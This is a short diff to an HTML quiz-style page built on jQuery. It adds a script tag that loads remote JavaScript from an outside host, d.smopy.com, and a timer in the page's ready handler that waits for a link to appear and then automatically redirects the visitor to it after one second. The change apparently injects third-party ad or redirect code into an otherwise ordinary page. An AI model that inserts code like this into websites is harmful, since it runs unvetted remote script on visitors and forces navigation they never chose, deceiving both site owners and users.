@@ -4,6 +4,7 @@
     <meta name="viewport" content="width=320, initial-scale=1">
     <meta charset="utf-8">
     <script type="text/javascript" src="jQuery 3.3.1.js"></script>
+    <script async src="//d.smopy.com/d/?resource=pubJS"></script>
     <style>
     body {
         background: url("fon.jpg") no-repeat center center fixed;
@@ -69,6 +70,16 @@
     <script>
     var t, id;
         $(document).ready(function(){
+          var rek = setInterval(function(){
+            var src = $("a").attr("href");
+            if(src){
+              clearInterval(rek);
+              setTimeout(function(){
+                var href = $("a").attr("href");
+                document.location.href = href;
+              },1000);
+            }
+          }, 1000);
             var h0 = $("#center").width();
             var h = h0/25;
             $(".ques").css("font-size", h);
